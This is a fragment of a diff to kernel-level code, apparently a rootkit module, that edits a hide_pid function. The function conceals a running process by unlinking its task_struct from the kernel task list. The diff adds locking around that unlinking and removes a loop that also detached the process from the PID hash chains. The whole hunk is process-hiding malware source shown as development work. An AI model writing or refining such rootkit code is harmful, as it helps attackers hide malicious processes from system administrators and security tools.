@@ -83,20 +83,10 @@ hide_pid(pid_t pid)
     if (!ts)
         return;
 
+    write_lock_irq(rwlock);
 	ts->tasks.prev->next = ts->tasks.next;
 	ts->tasks.next->prev = ts->tasks.prev;
-
-    int i;
-    struct pid *spid = get_task_pid(ts, PIDTYPE_PID);
-
-    for (i = 0; i <= spid->level; i++) {
-        struct upid *upid = spid->numbers + i;
-
-        if(upid->pid_chain.next)
-            upid->pid_chain.next->pprev = upid->pid_chain.pprev;
-
-        *upid->pid_chain.pprev = upid->pid_chain.next;
-    }
+    write_unlock_irq(rwlock);
 }
 
 void
